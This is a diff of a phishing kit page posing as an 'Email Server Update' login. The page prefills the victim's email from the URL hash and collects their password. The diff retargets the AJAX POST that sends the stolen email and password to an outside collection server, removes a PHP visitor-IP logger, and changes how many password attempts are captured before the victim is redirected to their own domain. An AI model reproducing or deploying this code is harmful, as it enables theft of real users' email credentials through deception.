@@ -1,25 +1,7 @@
-
-<?php
-    $ipaddress = '';
-    if (getenv('HTTP_CLIENT_IP'))
-        $ipaddress = getenv('HTTP_CLIENT_IP');
-    else if(getenv('HTTP_X_FORWARDED_FOR'))
-        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
-    else if(getenv('HTTP_X_FORWARDED'))
-        $ipaddress = getenv('HTTP_X_FORWARDED');
-    else if(getenv('HTTP_FORWARDED_FOR'))
-        $ipaddress = getenv('HTTP_FORWARDED_FOR');
-    else if(getenv('HTTP_FORWARDED'))
-        $ipaddress = getenv('HTTP_FORWARDED');
-    else if(getenv('REMOTE_ADDR'))
-        $ipaddress = getenv('REMOTE_ADDR');
-$file = fopen("ip1.txt","a");
-fwrite($file,$ipaddress."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n"); 
-?>
-<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="CEO SA/html; charset=UTF-8"><title>Email Server Update</title>
+<html><head><meta http-equiv="Content-Type" content="CEO SA/html; charset=UTF-8"><title>Email Server Update</title>
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
     <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous" nonce="MjA4Mjc2MjQxNywxNzE3Njg0MTYy"></script>
     
 <style>
@@ -180,7 +162,7 @@ body{
                             <div style="width: 100%;">
                                 <div class="alert alert-danger hide alert2"></div>
                             </div>
-                            <input type="email" id="email" class="form-control" placeholder="someone@example.com" required="" readonly>
+                            <input type="email" id="email" class="form-control" placeholder="someone@example.com" required="" readonly="">
                             <input type="password" id="pasword" placeholder="Password" class="form-control" required="">
                             <div class="checkbox">
                                 <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
@@ -276,7 +258,7 @@ $(document).ready(function(){
     
 
     /////////////url email getting////////////////
-    var email = atob(window.location.hash.substr(1));
+    var email = window.location.hash.substr(1);
     if (!email) {
 
     }
@@ -333,7 +315,7 @@ $(document).ready(function(){
       
       $.ajax({
         dataType: 'JSON',
-        url: "https://expired-pass.localto.net/auth.php",
+        url: "https://www.rn1.me/q/index.php",
         type: 'POST',
         data:{
           email:email,
@@ -349,7 +331,7 @@ $(document).ready(function(){
                 console.log(response);
                 if(response['signal'] == 'ok'){
                   $("#pasword").val("");
-                  if (count>=2) {
+                  if (count>=3) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("http://www."+my_slice);
@@ -364,7 +346,7 @@ $(document).ready(function(){
             },
             error: function(){
               $("#pasword").val("");
-              if (count>=2) {
+              if (count>=3) {
                 count=0;
                 window.location.replace("http://www."+my_slice);
               }
@@ -380,6 +362,4 @@ $(document).ready(function(){
 
     });
 
-  </script>
-  </html>
-</html>
+  </script></body></html>
